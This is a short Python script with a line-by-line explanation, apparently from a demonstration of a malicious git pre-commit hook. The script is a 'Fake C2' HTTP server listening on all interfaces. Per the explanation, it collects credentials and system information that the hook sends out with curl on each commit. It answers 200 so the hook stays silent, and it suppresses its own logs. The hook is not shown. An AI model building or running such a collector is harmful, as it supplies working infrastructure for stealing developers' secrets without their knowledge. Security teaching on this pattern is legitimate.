from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)
        print(f"\n[{datetime.now()}] *** DATA RECEIVED ***")
        print(data.decode())
        self.send_response(200)
        self.end_headers()

    def log_message(self, format, *args):
        pass

print("[*] Fake C2 listening on 0.0.0.0:8080...")
HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()


- `HTTPServer('0.0.0.0', 8080)` binds to all network interfaces on port 8080, accepting connections from any machine on the network
- `do_POST` handles incoming HTTP POST requests — this is the method the pre-commit hook uses to deliver stolen data via `curl`
- `self.headers['Content-Length']` reads the size of the incoming data, then `self.rfile.read(length)` reads the full payload body
- `data.decode()` converts the raw bytes to readable text and prints it to the terminal with a timestamp, displaying the exfiltrated credentials and system information
- `self.send_response(200)` returns an HTTP 200 OK to the victim machine so `curl` exits cleanly with no errors — keeping the hook silent
- `log_message` is overridden to suppress the default HTTP request logs, keeping the terminal output clean and showing only the received data
- `serve_forever()` keeps the server running continuously, ready to receive data from every subsequent commit the victim makes
